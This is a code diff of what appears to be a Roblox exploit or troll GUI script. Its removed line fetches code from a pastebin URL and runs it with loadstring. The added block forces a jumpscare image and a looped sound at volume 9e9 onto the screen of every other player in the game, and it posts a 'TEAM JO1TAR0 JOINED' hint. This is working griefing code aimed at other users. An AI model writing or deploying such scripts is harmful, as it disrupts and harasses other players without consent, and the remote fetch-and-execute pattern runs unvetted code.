@@ -451,7 +451,32 @@ JUMPSCARE.TextScaled = true
 JUMPSCARE.TextSize = 500
 JUMPSCARE.TextWrapped = true
 JUMPSCARE.MouseButton1Down:connect(function()
-loadstring(game:HttpGet("https://pastebin.com/raw/hC13xQ9s"))()
+for i,v in pairs(game.Players:GetPlayers()) do
+		if v.Name ~= me and not v.PlayerGui:FindFirstChild("k00pkidd's Jumpscare") and v:FindFirstChild("PlayerGui") then
+			spawn(function()
+				local newgui = Instance.new("ScreenGui",v.PlayerGui)
+				newgui.Name = "k00p's Jumpscare"
+				local newimage = Instance.new("ImageLabel",newgui)
+				newimage.Image = "rbxassetid://15777105027"
+				newimage.Size = UDim2.new(0,900,0,345)
+                               
+                                newimage.BackgroundTransparency = 1
+                                local m = Instance.new("Hint", game.workspace)
+		                m.Text = "TEAM JO1TAR0 JOINED TODAY HAHAHA!11!2!"
+       s = Instance.new("Sound",newgui)
+				s.SoundId = "rbxassetid://8683380188"
+				s.Volume = 9e9
+				s.Looped = true
+				s:Play()
+				print("Screamed "..v.Name)
+				while wait(9) do
+
+					newimage.Parent:Destroy()
+
+				end
+			end)
+		end
+	end
 end)
 
 -- Scripts :
